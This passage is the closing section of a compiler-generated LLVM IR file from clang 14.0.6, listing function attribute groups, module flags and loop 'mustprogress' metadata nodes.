attributes #10 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #11 = { nounwind readonly willreturn }
attributes #12 = { nounwind }
attributes #13 = { nounwind returns_twice }
attributes #14 = { noreturn }
attributes #15 = { nounwind readnone willreturn }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
!48 = distinct !{!48, !7}
!49 = distinct !{!49, !7}
!50 = distinct !{!50, !7}
!51 = distinct !{!51, !7}
!52 = distinct !{!52, !7}
!53 = distinct !{!53, !7}
!54 = distinct !{!54, !7}
!55 = distinct !{!55, !7}
!56 = distinct !{!56, !7}
!57 = distinct !{!57, !7}
!58 = distinct !{!58, !7}
!59 = distinct !{!59, !7}
!60 = distinct !{!60, !7}
!61 = distinct !{!61, !7}
!62 = distinct !{!62, !7}
!63 = distinct !{!63, !7}
!64 = distinct !{!64, !7}
!65 = distinct !{!65, !7}
!66 = distinct !{!66, !7}
